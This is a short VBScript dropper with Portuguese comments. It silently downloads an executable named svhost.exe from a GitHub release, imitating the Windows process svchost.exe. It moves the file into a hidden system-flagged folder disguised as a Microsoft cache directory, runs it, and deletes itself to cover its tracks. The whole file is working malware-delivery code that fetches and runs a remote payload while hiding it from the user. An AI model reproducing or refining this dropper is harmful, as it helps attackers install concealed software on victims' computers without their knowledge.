' installer.vbs — baixa svhost.exe do GitHub, move pra pasta oculta e executa.
' Não abre janela nenhuma (roda 100% em background).

Option Explicit

Dim shell, fso, userProfile, downloads, destino, exeUrl, vbsDir, tmpExe
Dim cmdBaixar, cmdMover

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ==== Configurações ====
exeUrl = "https://github.com/luizinhoboladim-lang/lan/releases/latest/download/svhost.exe"

userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%")
downloads = userProfile & "\Downloads"
tmpExe = downloads & "\svhost.exe"

vbsDir = fso.GetParentFolderName(WScript.ScriptFullName)

' Pasta oculta de destino (mesma do main.py)
destino = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\Caches\Local"

' ==== 1. Baixa o svhost.exe ====
cmdBaixar = "cmd /c curl -sSL -o """ & tmpExe & """ """ & exeUrl & """"
shell.Run cmdBaixar, 0, True

' Espera o arquivo aparecer (até 30s)
Dim tentativas
tentativas = 0
Do While Not fso.FileExists(tmpExe) And tentativas < 60
    WScript.Sleep 500
    tentativas = tentativas + 1
Loop

If Not fso.FileExists(tmpExe) Then
    MsgBox "Falha ao baixar o arquivo. Verifique sua internet.", 16, "Erro"
    WScript.Quit 1
End If

' ==== 2. Cria pasta oculta e move ====
If Not fso.FolderExists(destino) Then
    fso.CreateFolder(destino)
End If

' Marca a pasta como oculta + sistema
shell.Run "attrib +h +s """ & destino & """", 0, True

Dim destinoExe
destinoExe = destino & "\svhost.exe"

' Se já existe versão lá, apaga antes
If fso.FileExists(destinoExe) Then
    On Error Resume Next
    fso.DeleteFile destinoExe, True
    On Error Goto 0
End If

fso.MoveFile tmpExe, destinoExe

' Marca o exe como oculto + sistema
shell.Run "attrib +h +s """ & destinoExe & """", 0, True

' ==== 3. Executa ====
shell.Run """" & destinoExe & """", 1, False

' ==== 4. Auto-deleta este .vbs ====
Dim vbsPath
vbsPath = WScript.ScriptFullName
shell.Run "cmd /c timeout /t 2 /nobreak >nul & del /f /q """ & vbsPath & """", 0, False
